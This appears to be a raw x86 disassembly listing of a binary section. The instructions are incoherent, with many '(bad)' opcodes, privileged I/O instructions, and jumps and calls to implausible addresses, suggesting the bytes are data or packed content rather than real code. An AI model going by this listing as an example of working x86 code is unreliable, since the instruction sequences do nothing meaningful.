  4206d3:	and    esi,DWORD PTR [ebp+0x461cf06a]
  4206d9:	ja     0x42073a
  4206db:	into   
  4206dc:	or     DWORD PTR [esi-0x6c],ebx
  4206df:	in     eax,0xa9
  4206e1:	jle    0x420673
  4206e3:	ret    0x98aa
  4206e6:	loopne 0x420726
  4206e8:	je     0x420732
  4206ea:	stc    
  4206eb:	pushf  
  4206ec:	pop    es
  4206ed:	sub    eax,0x698c87f3
  4206f2:	(bad)  
  4206f3:	shl    DWORD PTR [ebp+0x1146f3ff],cl
  4206f9:	mov    esp,0x17f2c1e5
  4206fe:	data16 cmp al,BYTE PTR [edi+0x71]
  420702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420703:	imul   esi,DWORD PTR [ebp+0x6eacc7fa],0x20
  42070a:	das    
  42070b:	add    DWORD PTR ds:0xf97bf18f,esi
  420711:	js     0x4206de
  420713:	dec    edi
  420714:	cwde   
  420715:	adc    DWORD PTR [esi],edx
  420717:	push   ebx
  420718:	adc    esi,ecx
  42071a:	mov    ah,0x2c
  42071c:	push   esi
  42071d:	and    al,BYTE PTR [edi+0xc691e0]
  420723:	or     DWORD PTR [ebp+0x14b61044],ecx
  420729:	int3   
  42072a:	aam    0xed
  42072c:	jmp    FWORD PTR [ecx+0x3d137f96]
  420732:	leave  
  420733:	pop    edx
  420734:	arpl   WORD PTR [ecx],bp
  420736:	loopne 0x420725
  420738:	mov    al,ds:0x39bcd03f
  42073d:	(bad)  [ebx-0x68]
  420740:	ret    
  420741:	or     bl,BYTE PTR [edi-0x1f]
  420744:	sub    BYTE PTR [edx+0x2893836],dl
  42074a:	outs   dx,BYTE PTR ds:[esi]
  42074b:	imul   ebx,DWORD PTR ds:0x712de45d,0xffffffe7
  420752:	mov    edi,0xed9c1c29
  420757:	push   es
  420758:	call   0x6eaded1f
  42075d:	mov    ah,0x23
  42075f:	sub    esp,edx
  420761:	shr    ah,cl
  420763:	ins    BYTE PTR es:[edi],dx
  420764:	sbb    eax,0x2c0e8bf1
  420769:	pop    eax
  42076a:	in     eax,0xa0
  42076c:	hlt    
  42076d:	add    ebp,DWORD PTR [esi+0x30]
  420770:	add    DWORD PTR [ecx+0x4eee7fd1],esi
  420776:	jge    0x42071e
  420778:	add    DWORD PTR [ecx+0x30],ebx
  42077b:	cdq    
  42077c:	shr    esp,0x9a
  42077f:	mov    ah,0x9d
  420781:	push   eax
  420782:	cli    
  420783:	test   al,0x4d
  420785:	adc    al,0xf5
  420787:	jae    0x4207cb
  420789:	mov    bh,0x47
  42078b:	or     BYTE PTR [esi+0x2cff183],al
  420791:	mov    esi,0x38cb0ecb
  420796:	inc    edx
  420797:	and    dl,BYTE PTR [edi-0x5f]
  42079a:	lahf   
  42079b:	adc    BYTE PTR [eax+ecx*4-0x54825d92],bl
  4207a2:	pop    ecx
  4207a3:	jecxz  0x4207f9
  4207a5:	inc    bl
  4207a7:	mov    cl,BYTE PTR [edx-0x7080bf5e]
  4207ad:	mov    al,ds:0x448a2d12
  4207b2:	inc    ecx
  4207b3:	imul   ecx,DWORD PTR [edx+0x18],0xffffffde
  4207b7:	inc    bh
  4207b9:	ficom  DWORD PTR [ecx+0x27]
  4207bc:	shr    esi,cl
  4207be:	jb     0x42076b
  4207c0:	fbld   TBYTE PTR [ecx+0x0]
	...
  420832:	add    BYTE PTR [eax],al
  420834:	mov    eax,ds:0x3b920b9a
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x2b
  420841:	pop    ecx
  420842:	inc    eax
  420843:	jb     0x4207f9
  420845:	pop    esp
  420846:	add    DWORD PTR [eax],eax
  420848:	test   BYTE PTR [eax],0x0
  42084b:	add    BYTE PTR [ebx+0x6cf35827],cl
  420851:	je     0x4208b7
  420853:	cwde   
  420854:	retf   
  420855:	shr    BYTE PTR [ecx-0x71e4a047],0x36
  42085c:	outs   dx,DWORD PTR ds:[esi]
  42085d:	adc    al,0x59
  42085f:	cld    
  420860:	pop    es
  420861:	fisubr DWORD PTR [esi]
  420863:	fcmovnb st,st(6)
  420865:	fild   QWORD PTR [ebx-0x7f]
  420868:	fdiv   QWORD PTR [ebp+0xd]
  42086b:	push   cs
  42086c:	and    eax,0xd1bfb0db
  420871:	xor    bl,ch
  420873:	inc    ebp
  420874:	outs   dx,DWORD PTR ds:[esi]
  420875:	icebp  
  420876:	mov    dl,0xa0
  420878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420879:	lea    ebp,[edx-0x673ac748]
  42087f:	iret   
  420880:	mov    edi,0x7d0779ef
  420885:	sbb    BYTE PTR [edi-0x3e],bl
  420888:	retf   
  420889:	mov    ds:0xe024cf3,eax
  42088e:	into   
  42088f:	xchg   ebx,eax
  420890:	hlt    
  420891:	xor    BYTE PTR [ecx+0x30],0xd6
  420895:	popa   
  420896:	repnz sbb al,0xf7
  420899:	in     eax,0xcc
  42089b:	cld    
  42089c:	jecxz  0x420835
  42089e:	sahf   
  42089f:	or     eax,0x4febe0dc
  4208a4:	xchg   edx,eax
  4208a5:	aad    0xdc
  4208a7:	sbb    DWORD PTR [esi+esi*1],esp
  4208aa:	loopne 0x420899
  4208ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ad:	sbb    al,0xfd
  4208af:	cmp    al,0x6f
  4208b1:	inc    edi
  4208b2:	mov    cl,BYTE PTR [ebx+ebp*1]
  4208b5:	push   es
  4208b6:	fwait
  4208b7:	ds cmc 
  4208b9:	pop    eax
  4208ba:	and    BYTE PTR ds:0x3333eb1,0x8
  4208c1:	adc    eax,0x48e1ee4d
  4208c6:	inc    esi
  4208c7:	mov    edx,0xe1bb4e37
  4208cc:	inc    ebp
  4208cd:	push   0xffffffbb
  4208cf:	jecxz  0x420878
  4208d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208d2:	arpl   WORD PTR ds:0xb07c8f2a,bx
  4208d8:	jmp    0x3e4d:0xb8ca89f6
  4208df:	and    DWORD PTR [eax-0x233c9755],0x422cdcc3
  4208e9:	sbb    edx,DWORD PTR [edi+0x5a7d7b90]
  4208ef:	pop    es
  4208f0:	cdq    
  4208f1:	and    DWORD PTR [edx-0x31],ecx
  4208f4:	int    0xd8
  4208f6:	adc    BYTE PTR [esi-0x10],ah
  4208f9:	pop    edx
  4208fa:	pop    ebp
  4208fb:	out    dx,eax
  4208fc:	sub    eax,0x92d3e76c
  420901:	das    
  420902:	(bad)  
  420903:	cld    
  420904:	add    BYTE PTR [esi-0x17],dl
  420907:	jns    0x4208c3
  420909:	xlat   BYTE PTR ds:[ebx]
  42090a:	pop    esi
  42090b:	lock and bl,ch
  42090e:	add    eax,0xbe4ad8c8
  420913:	hlt    
  420914:	iret   
  420915:	fwait
  420916:	dec    ebp
  420917:	add    DWORD PTR [ebx+0x1368ac02],ebx
  42091d:	inc    ebp
  42091e:	mov    ecx,esi
  420920:	neg    bh
  420922:	dec    edx
  420923:	outs   dx,BYTE PTR ds:[esi]
  420924:	out    0xf5,eax
  420926:	int    0x25
  420928:	in     eax,0x3
  42092a:	mov    bh,0xc4
  42092c:	imul   esi,DWORD PTR [ebp+0x614e7179],0xffffffcd
  420933:	ins    BYTE PTR es:[edi],dx
  420934:	test   eax,0x874bc46f
  420939:	int    0x29
  42093b:	or     DWORD PTR [eax+ebp*4],ebx
  42093e:	leave  
  42093f:	push   0x6b
  420941:	dec    edx
	...
  4209b2:	add    BYTE PTR [eax],al
  4209b4:	or     al,BYTE PTR [ecx-0x49]
  4209b7:	mov    eax,ds:0xeb1ef7ff
  4209bc:	rcr    BYTE PTR [esi-0x66a19922],0x31
  4209c3:	repnz stos BYTE PTR es:[edi],al
  4209c5:	pop    ebp
  4209c6:	add    DWORD PTR [eax],eax
  4209c8:	test   BYTE PTR [eax],0x0
  4209cb:	add    BYTE PTR [edx],dl
  4209cd:	cmp    dh,al
  4209cf:	sub    DWORD PTR [ebx+ebp*8],esi
  4209d2:	mov    ch,0x4b
  4209d4:	add    eax,0x37da02e0
  4209d9:	xlat   BYTE PTR ds:[ebx]
  4209da:	and    BYTE PTR [edi+0x3c],0x58
  4209de:	pushf  
  4209df:	shl    DWORD PTR ds:0x487a251a,0xba
  4209e6:	in     al,0x82
  4209e8:	jg     0x420a48
  4209ea:	hlt    
  4209eb:	mov    BYTE PTR [edx],bh
  4209ed:	xor    al,BYTE PTR [eax-0x5baa23e1]
  4209f3:	pop    ebx
  4209f4:	test   al,0x6c
  4209f6:	sti    
  4209f7:	adc    cl,BYTE PTR [edx+ebp*4+0x6d]
  4209fb:	mov    eax,0x18edfb02
  420a00:	mov    eax,0xbd2b5828
  420a05:	adc    BYTE PTR [eax],bh
  420a07:	fwait
  420a08:	push   ebx
  420a09:	retf   
  420a0a:	push   edi
  420a0b:	stos   BYTE PTR es:[edi],al
  420a0c:	ins    BYTE PTR es:[edi],dx
  420a0d:	xor    cl,BYTE PTR [ebp+esi*1-0x43]
  420a11:	mov    ah,0x47
  420a13:	je     0x420a20
  420a15:	pop    edi
  420a16:	cmp    al,cl
  420a18:	inc    esi
  420a19:	dec    ebx
  420a1a:	call   0x4c7769dc
  420a1f:	cmp    ax,0xcf5a
  420a23:	aad    0x80
  420a25:	add    ebx,eax
  420a27:	mov    BYTE PTR [ebp-0x70367ff1],bh
  420a2d:	sub    ah,BYTE PTR [edx]
  420a2f:	pop    edx
  420a30:	scas   al,BYTE PTR es:[edi]
  420a31:	adc    eax,0x565fcea1
  420a36:	shl    eax,cl
  420a38:	dec    eax
  420a39:	fs push es
  420a3b:	ror    al,1
  420a3d:	mov    BYTE PTR [edx],ch
  420a3f:	sbb    BYTE PTR [edx+edi*4],dl
  420a42:	sbb    eax,0xd766fc2e
  420a47:	daa    
  420a48:	inc    ebx
  420a49:	xchg   BYTE PTR [edx+0x4ded02f3],ch
  420a4f:	mov    edi,0x4fab8d56
  420a54:	stc    
  420a55:	add    BYTE PTR [eax],dh
  420a57:	mov    esp,DWORD PTR [ecx]
  420a59:	ror    DWORD PTR [ecx],1
  420a5b:	pop    es
  420a5c:	fnstenv ds:0x7337df5d
  420a62:	jmp    0x4862:0x9bdd7681
  420a69:	dec    esp
  420a6a:	sub    dh,al
  420a6c:	cld    
  420a6d:	(bad)  
  420a6e:	inc    ebx
  420a6f:	(bad)  
  420a70:	stc    
  420a71:	pop    ecx
  420a72:	popa   
  420a73:	les    eax,FWORD PTR [eax]
  420a75:	in     al,0x53
  420a77:	adc    dh,dl
  420a79:	xchg   ecx,eax
  420a7a:	jo     0x420a0a
  420a7c:	in     eax,dx
  420a7d:	leave  
  420a7e:	jnp    0x420a56
  420a80:	imul   esp,DWORD PTR [ebx+0x7528598b],0x11
  420a87:	icebp  
  420a88:	sar    BYTE PTR [edi-0x9dfd0e4],1
  420a8e:	and    esi,esi
  420a90:	pop    es
  420a91:	loope  0x420aef
  420a93:	ror    ch,1
  420a95:	ds mov ebx,ecx
  420a98:	retf   0xae
  420a9b:	scas   al,BYTE PTR es:[edi]
  420a9c:	arpl   WORD PTR [edi-0x3],si
  420a9f:	in     al,0x35
  420aa1:	push   es
  420aa2:	daa    
  420aa3:	cld    
  420aa4:	mov    esi,0xac7d1ba4
  420aa9:	mov    ds:0xebf70ccd,eax
  420aae:	pop    ebp
  420aaf:	out    dx,al
  420ab0:	stos   DWORD PTR es:[edi],eax
  420ab1:	scas   eax,DWORD PTR es:[edi]
  420ab2:	adc    al,0xd3
  420ab4:	dec    ebp
  420ab5:	xchg   esi,eax
  420ab6:	add    DWORD PTR [esi],0xd235e7d0
  420abc:	int3   
  420abd:	add    DWORD PTR [ebp+0x83c0a7],esp
	...
  420b33:	add    ah,bl
  420b35:	sub    BYTE PTR [edx-0x119011c],cl
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	cmovnp ebx,DWORD PTR [ebx]
  420b42:	sbb    eax,eax
  420b44:	mov    al,ds:0xf600015e
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR [esi],al
  420b4d:	das    
  420b4e:	mov    DWORD PTR [ebx-0x206d4a9d],ecx
  420b54:	and    ch,BYTE PTR [edi-0x77]
  420b57:	sub    ebx,DWORD PTR [ecx+0x5e7bbc03]
  420b5d:	js     0x420b1f
  420b5f:	pop    ds
  420b60:	sub    eax,ebx
  420b62:	sbb    BYTE PTR [esi-0x393affb9],ch
  420b68:	jl     0x420aed
  420b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b6b:	and    dl,BYTE PTR [edi+0x33]
  420b6e:	imul   ebp,DWORD PTR [esp+ebx*2],0xffffff99
  420b72:	mov    esp,0xc2d68aeb
  420b77:	xchg   ebp,eax
  420b78:	cmp    al,0x43
  420b7a:	adc    DWORD PTR [eax-0x59],ebx
  420b7d:	fmul   QWORD PTR [eax]
  420b7f:	or     ah,BYTE PTR [edi-0x4885f437]
  420b85:	out    dx,eax
  420b86:	daa    
  420b87:	sbb    eax,0xeb0ccc67
  420b8c:	push   0xd297126c
  420b91:	push   edx
  420b92:	inc    esp
  420b93:	js     0x420b1f
  420b95:	push   es
  420b96:	sti    
  420b97:	jge    0x420b74
  420b99:	out    0xea,eax
  420b9b:	bound  edi,QWORD PTR [edi-0x5c3c9f65]
  420ba1:	(bad)  ds:0xd4dcb03d
  420ba7:	das    
  420ba8:	mov    ah,0xd2
  420baa:	outs   dx,BYTE PTR ds:[esi]
  420bab:	add    dh,BYTE PTR [esi]
  420bad:	jne    0x420b9a
  420baf:	xor    edx,ecx
  420bb1:	xor    BYTE PTR [ebp-0x1d1af784],ah
  420bb7:	mov    DWORD PTR [ecx],0x63e74184
  420bbd:	dec    eax
  420bbe:	sub    eax,0x6e911224
  420bc3:	xchg   edi,eax
  420bc4:	test   al,0x5f
  420bc6:	mov    edi,0xc878b372
  420bcb:	fwait
  420bcc:	push   ebp
  420bcd:	jp     0x420b4f
  420bcf:	mov    bl,0xa0
  420bd1:	inc    esi
  420bd2:	bound  ebx,QWORD PTR [edi-0x302f7850]
  420bd8:	inc    ebp
  420bd9:	xor    al,BYTE PTR [ebp-0x42]
  420bdc:	aaa    
  420bdd:	sahf   
  420bde:	dec    edi
  420bdf:	icebp  
  420be0:	ins    BYTE PTR es:[edi],dx
  420be1:	xor    al,0xc
  420be3:	xchg   ebx,eax
  420be4:	sbb    BYTE PTR [edx],bh
  420be6:	mov    eax,ds:0x296caa37
  420beb:	or     BYTE PTR [edx-0x5b26a6d0],cl
  420bf1:	es xchg ecx,eax
  420bf3:	xchg   ebp,eax
  420bf4:	sub    dh,BYTE PTR ds:0x46caa5e5
  420bfa:	lahf   
  420bfb:	fcmovne st,st(2)
  420bfd:	and    al,0xe
  420bff:	lock xchg edx,eax
  420c01:	inc    edi
  420c02:	xchg   ecx,eax
  420c03:	fdivrp st(2),st
  420c05:	(bad)  
  420c06:	aaa    
  420c07:	add    dh,BYTE PTR [edi]
  420c09:	mov    ebx,0x1357ffa4
  420c0e:	scas   al,BYTE PTR es:[edi]
  420c0f:	call   0x65ff6b61
  420c14:	ret    
  420c15:	sbb    al,0x9a
  420c17:	(bad)  
  420c18:	pop    ebp
  420c19:	jb     0x420bbb
  420c1b:	dec    ebp
  420c1c:	or     ch,BYTE PTR [ebp+0x3cd87cc9]
  420c22:	pop    es
  420c23:	pop    esi
  420c24:	xchg   edi,eax
  420c25:	gs int3 
  420c27:	adc    dh,bl
  420c29:	sbb    BYTE PTR [ebp-0x4eb0df3],ch
  420c2f:	ror    DWORD PTR [ebx+0x61],1
  420c32:	mov    ecx,0xa4a21f9c
  420c37:	add    eax,0xbf45fb41
  420c3c:	popa   
  420c3d:	and    dh,BYTE PTR [eax]
  420c3f:	pop    eax
  420c40:	jl     0x420c5a
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x79f84d5f
  420cc3:	xor    al,0x96
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	test   BYTE PTR [eax],0x0
  420ccb:	add    ah,al
  420ccd:	imul   ecx,DWORD PTR [ebx-0x60],0x60
  420cd1:	stc    
  420cd2:	xor    dl,dh
  420cd4:	add    edi,DWORD PTR [bp+0x7ac2]
  420cd9:	adc    BYTE PTR [ecx+0x30b3c17e],bl
  420cdf:	(bad)  
  420ce0:	stos   DWORD PTR es:[edi],eax
  420ce1:	dec    edx
  420ce2:	cmp    eax,DWORD PTR [edx+eiz*1]
  420ce5:	pop    ds
  420ce6:	das    
  420ce7:	jno    0x420d68
  420ce9:	sub    al,0xdf
  420ceb:	mov    ds:0xb4da7402,al
  420cf0:	add    bh,BYTE PTR [esi]
  420cf2:	data16 sahf 
  420cf4:	sub    ecx,edx
  420cf6:	xchg   ebp,eax
  420cf7:	mov    es,WORD PTR [edi+0x5]
  420cfa:	xchg   ebx,eax
  420cfb:	jbe    0x420cab
  420cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cfe:	or     esi,edx
  420d00:	pop    esi
  420d01:	(bad)  [edi]
  420d03:	xchg   ebx,eax
  420d04:	and    BYTE PTR [ecx-0x54041aba],dh
  420d0a:	sahf   
  420d0b:	pop    ds
  420d0c:	lods   al,BYTE PTR ds:[esi]
  420d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d0e:	sbb    bh,0xef
  420d11:	sti    
  420d12:	mov    eax,ds:0x99be854d
  420d17:	or     al,ah
  420d19:	sahf   
  420d1a:	mov    ch,0x6c
  420d1c:	xor    al,ah
  420d1e:	push   cs
  420d1f:	mov    ebp,DWORD PTR [esi+0x5a]
  420d22:	out    0x45,eax
  420d24:	add    DWORD PTR [ebp+0x56d57cff],0xc639a4cd
  420d2e:	sbb    al,0xc0
  420d30:	jne    0x420d17
  420d32:	scas   al,BYTE PTR es:[edi]
  420d33:	mov    eax,ds:0x598847dd
  420d38:	ret    0x13ea
  420d3b:	push   esp
  420d3c:	jg     0x420ccf
  420d3e:	push   es
  420d3f:	sbb    esp,DWORD PTR [edi+0x2e]
  420d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d43:	aad    0x86
  420d45:	loop   0x420dc6
  420d47:	fld    DWORD PTR [edi]
  420d49:	mov    ebp,0x43ce6497
  420d4e:	adc    eax,0xe5f18046
  420d53:	inc    edi
  420d54:	pop    eax
  420d55:	rcl    ebp,0xd8
  420d58:	retf   0x7f81
  420d5b:	mov    ch,ah
  420d5d:	sub    dl,bh
  420d5f:	scas   eax,DWORD PTR es:[edi]
  420d60:	lods   eax,DWORD PTR ds:[esi]
  420d61:	and    DWORD PTR [eax],eax
  420d63:	sub    eax,ebx
  420d65:	inc    ebp
  420d66:	cmp    dh,BYTE PTR [ebp-0x4d3171c1]
  420d6c:	nop
  420d6d:	mov    ebx,0xb733b907
  420d72:	cmp    al,0x68
  420d74:	fiadd  DWORD PTR [ebp-0x49]
  420d77:	clc    
  420d78:	popa   
  420d79:	inc    ecx
  420d7a:	mov    bh,0x89
  420d7c:	xor    ch,BYTE PTR [ebp-0x256f9c04]
  420d82:	ret    0xeb67
  420d85:	jne    0x420d52
  420d87:	mov    ebp,0x9f57fc3d
  420d8c:	call   0x5f3e4a8a
  420d91:	dec    ebp
  420d92:	jle    0x420d4b
  420d94:	push   0x455102eb
  420d99:	jns    0x420de5
  420d9b:	mov    DWORD PTR [eax],edx
  420d9d:	xchg   BYTE PTR [ebx],dh
  420d9f:	fild   WORD PTR [edx+0x2dc04981]
  420da5:	(bad)  
  420da6:	cmp    eax,0xa6e0e93c
  420dab:	xchg   edi,eax
  420dac:	mov    eax,0xdb1a8ec9
  420db1:	jmp    0xfeefbfce
  420db6:	dec    ebx
  420db7:	push   esi
  420db8:	ins    DWORD PTR es:[edi],dx
  420db9:	mov    ebx,0xad8eef53
  420dbe:	mov    al,ds:0xba6486
	...
  420e33:	add    BYTE PTR [edx-0x1865ab],ch
  420e39:	out    dx,eax
  420e3a:	call   FWORD PTR [ebp+0x64]
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	out    0xe9,eax
  420e42:	mov    ?,WORD PTR [ebp-0x74]
  420e45:	pusha  
  420e46:	add    DWORD PTR [eax],eax
  420e48:	test   BYTE PTR [eax],0x0
  420e4b:	add    BYTE PTR [edi-0x31],al
  420e4e:	dec    esi
  420e4f:	dec    edx
  420e50:	or     esi,ebp
  420e52:	inc    ebp
  420e53:	xor    al,BYTE PTR [edx+0x30746953]
  420e59:	dec    ebx
  420e5a:	mov    bh,0x2a
  420e5c:	mov    ebp,0x16de50a9
  420e61:	jge    0x420e2e
  420e63:	leave  
  420e64:	pop    DWORD PTR [eax-0x43]
  420e67:	jnp    0x420e8c
  420e69:	and    ecx,DWORD PTR [ecx]
  420e6b:	outs   dx,DWORD PTR ds:[esi]
  420e6c:	mov    edx,0x27379bae
  420e71:	dec    BYTE PTR [eax+0x4a]
  420e74:	cmp    dh,ah
  420e76:	stos   BYTE PTR es:[edi],al
  420e77:	js     0x420eca
  420e79:	enter  0x6b51,0x53
  420e7d:	push   cs
  420e7e:	mov    ecx,0x1e6a5336
  420e83:	sbb    ah,dl
  420e85:	adc    ecx,DWORD PTR [eax]
  420e87:	dec    eax
  420e88:	sbb    ah,bl
  420e8a:	or     BYTE PTR [ebx-0x37],ch
  420e8d:	inc    esi
  420e8e:	lahf   
  420e8f:	mov    dh,0xbc
  420e91:	or     BYTE PTR [eax+0xaee1647],ah
  420e97:	mov    dh,0x3f
  420e99:	loope  0x420e7b
  420e9b:	dec    ebp
  420e9c:	pop    ecx
  420e9d:	sbb    eax,0x8dfafe73
  420ea2:	mov    ds:0xc89f85b8,al
  420ea7:	xor    BYTE PTR [edx],dh
  420ea9:	sbb    BYTE PTR ds:0x74ce4e59,ah
  420eaf:	test   eax,0xc52189c8
  420eb4:	mov    bl,0xc2
  420eb6:	in     al,0xb6
  420eb8:	aaa    
  420eb9:	daa    
  420eba:	(bad)  
  420ebb:	push   ss
  420ebc:	aas    
  420ebd:	stos   DWORD PTR es:[edi],eax
  420ebe:	scas   eax,DWORD PTR es:[edi]
  420ebf:	push   esp
  420ec0:	sub    cl,ch
  420ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ec3:	out    0x93,al
  420ec5:	inc    ebp
  420ec6:	nop
  420ec7:	rcr    BYTE PTR [eax-0x397ba30a],1
  420ecd:	sbb    BYTE PTR [edx+ecx*8+0x510aa245],0xde
  420ed5:	mov    esp,esi
  420ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ed8:	pop    DWORD PTR [eax]
  420eda:	cmp    eax,0xf328bd41
  420edf:	inc    edi
  420ee0:	adc    eax,DWORD PTR [ebx+0x4d]
  420ee3:	ins    BYTE PTR es:[edi],dx
  420ee4:	js     0x420ed1
  420ee6:	cld    
  420ee7:	jno    0x420eba
  420ee9:	call   0x1881:0x916dd92d
  420ef0:	pop    esi
  420ef1:	jnp    0x420f3d
  420ef3:	sub    al,0x25
  420ef5:	add    DWORD PTR [esi+0x4e],esi
  420ef8:	addr16 adc al,0x6f
  420efb:	in     al,0xb0
  420efd:	fisttp WORD PTR [ebp+0x554859c0]
  420f03:	aam    0xb
  420f05:	imul   DWORD PTR [ebx]
  420f07:	and    DWORD PTR [esi+eax*4+0x1b7aaa77],0x9e90957e
  420f12:	inc    edi
  420f13:	cmp    bl,BYTE PTR [edx+0x3cb5daf9]
  420f19:	cmp    eax,0xb43bf1e9
  420f1e:	mov    cs,WORD PTR [esi]
  420f20:	inc    ebp
  420f21:	adc    BYTE PTR [esi],0xba
  420f24:	in     al,0xa3
  420f26:	out    dx,al
  420f27:	push   0x4c132ced
  420f2c:	dec    esi
  420f2d:	out    0x33,al
  420f2f:	or     al,0x59
  420f31:	cwde   
  420f32:	icebp  
  420f33:	imul   eax,DWORD PTR [eax],0x6246a89
  420f39:	cmp    DWORD PTR [eax+edx*4+0x13fd10df],ecx
  420f40:	inc    ebp
  420f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  420fb2:	add    BYTE PTR [eax],al
  420fb4:	bound  esp,QWORD PTR [ebp-0x8808a]
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0xffffffde
  420fc1:	xchg   esi,eax
  420fc2:	mov    BYTE PTR [ebp-0x7e],bl
  420fc5:	popa   
  420fc6:	add    DWORD PTR [eax],eax
  420fc8:	test   BYTE PTR [eax],0x0
  420fcb:	add    BYTE PTR [edi],ah
  420fcd:	mov    al,0xeb
  420fcf:	jnp    0x420fd9
  420fd1:	sub    al,0xb2
  420fd3:	imul   ebx,DWORD PTR [ecx-0x60c912ad],0xffffffa1
  420fda:	rcl    BYTE PTR fs:[ebx+esi*8],0x44
  420fdf:	shl    DWORD PTR [ebp+eax*8-0x36],1
  420fe3:	adc    eax,0x45046c43
  420fe8:	idiv   eax
  420fea:	call   0x7301:0x2b08d8e4
  420ff1:	and    esi,DWORD PTR [edx-0x1a0e9bfe]
  420ff7:	and    al,0x38
  420ff9:	xor    eax,0xd6bb0523
  420ffe:	sub    DWORD PTR [edi+0x3319fbdb],ebp
  421004:	dec    eax
  421005:	xchg   esp,eax
  421006:	jmp    0xd6e1:0x9af8e8ff
  42100d:	inc    ecx
  42100e:	add    BYTE PTR [eax-0x2a],ah
  421011:	xchg   esi,eax
  421012:	dec    edi
  421013:	push   ecx
  421014:	dec    ebp
  421015:	fistp  QWORD PTR [eax]
  421017:	sub    esi,DWORD PTR [ebx]
  421019:	sbb    eax,0xeb848243
  42101e:	sbb    DWORD PTR [ebx-0x53b831f],esp
  421024:	add    eax,esp
  421026:	adc    DWORD PTR [esi],edx
  421028:	in     eax,dx
  421029:	or     eax,0x3f2ab3b0
  42102e:	mov    DWORD PTR [edx],eax
  421030:	cmp    BYTE PTR [esp+edx*2+0x3d],0x51
  421035:	pop    ebx
  421036:	sti    
  421037:	je     0x42105d
  421039:	in     eax,dx
  42103a:	and    dl,BYTE PTR [ebp+edi*8+0x789478a5]
  421041:	xchg   esi,eax
  421042:	add    ah,BYTE PTR [edx]
  421044:	or     DWORD PTR gs:[edi+0x76c04ad9],esp
  42104b:	mov    esi,0xb4c13287
  421050:	ds int3 
  421052:	inc    edi
  421053:	inc    edx
  421054:	imul   ebx,DWORD PTR [esi-0x14],0xf12fd0bb
  42105b:	push   ebx
  42105c:	xor    BYTE PTR [ebx],dh
  42105e:	jae    0x42103c
  421060:	jmp    0x23a79ac7
  421065:	mov    ebx,0x50227bd
  42106a:	ret    0x57a2
  42106d:	and    eax,0xe63fe1ca
  421072:	das    
  421073:	test   BYTE PTR ss:[esi],ch
  421076:	inc    eax
  421077:	ror    DWORD PTR [edi],1
  421079:	rcr    BYTE PTR [ebx-0x7c],1
  42107c:	fidivr WORD PTR [eax-0x43]
  42107f:	mov    edx,0xb1bfaaf9
  421084:	stos   DWORD PTR es:[edi],eax
  421085:	jbe    0x4210a7
  421087:	fcom   DWORD PTR [ecx]
  421089:	pop    edi
  42108a:	jae    0x4210f2
  42108c:	test   al,0xd0
  42108e:	mov    eax,ds:0xe7246ab8
  421093:	lock pop ebp
  421095:	xchg   ebp,eax
  421096:	dec    esi
  421097:	sar    DWORD PTR [ebx],cl
  421099:	cld    
  42109a:	fnstcw WORD PTR [ecx]
  42109c:	pop    edx
  42109d:	jb     0x42105a
  42109f:	out    0xb9,al
  4210a1:	add    DWORD PTR [ecx-0x2d],edx
  4210a4:	push   edi
  4210a5:	pop    es
  4210a6:	push   cs
  4210a7:	fsub   DWORD PTR [ebx+0x562ae605]
  4210ad:	lock xor DWORD PTR [edx],ecx
  4210b0:	shl    BYTE PTR [ebp-0x7ef33015],cl
  4210b6:	jmp    0xc2337835
  4210bb:	ror    ah,1
  4210bd:	mov    ebp,0xe28130a0
	...
  421132:	add    BYTE PTR [eax],al
  421134:	jae    0x421105
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x4210dd
  421141:	stos   BYTE PTR es:[edi],al
  421142:	xor    DWORD PTR [edi+0x16278],ecx
  421148:	test   BYTE PTR [eax],0x0
  42114b:	add    BYTE PTR [esi],bh
  42114d:	jmp    0xd545:0x736b617b
  421154:	sbb    eax,0x9ee528f6
  421159:	enter  0xef18,0x6
  42115d:	xchg   edx,eax
  42115e:	cmp    BYTE PTR [esi],ah
  421160:	out    dx,eax
  421161:	sub    dl,BYTE PTR [ecx+ebp*2]
  421164:	cmp    DWORD PTR [edx+ebp*4],ecx
  421167:	xchg   esi,eax
  421168:	repz jmp 0x4211bc
  42116b:	add    DWORD PTR [ebx-0x407fcece],edx
  421171:	int3   
  421172:	ret    
  421173:	retw   0x74a5
  421177:	into   
  421178:	ficomp DWORD PTR [esi-0x421f5dee]
  42117e:	xor    eax,0xde6f5163
  421183:	ss mov ebx,0x38cede3a
  421189:	test   eax,0xf4840b51
  42118e:	loope  0x421168
  421190:	sub    dl,BYTE PTR ds:0x84dd1d58
  421196:	lea    ebp,gs:[eax+0x680d5254]
  42119d:	xor    dl,cl
  42119f:	inc    eax
  4211a0:	cwde   
  4211a1:	sbb    al,0x9f
  4211a3:	or     eax,0xcba14cd6
  4211a8:	outs   dx,WORD PTR ds:[esi]
  4211aa:	retf   
  4211ab:	fdivr  DWORD PTR [ebx+0x75]
  4211ae:	(bad)  
  4211af:	loop   0x421145
  4211b1:	pop    ds
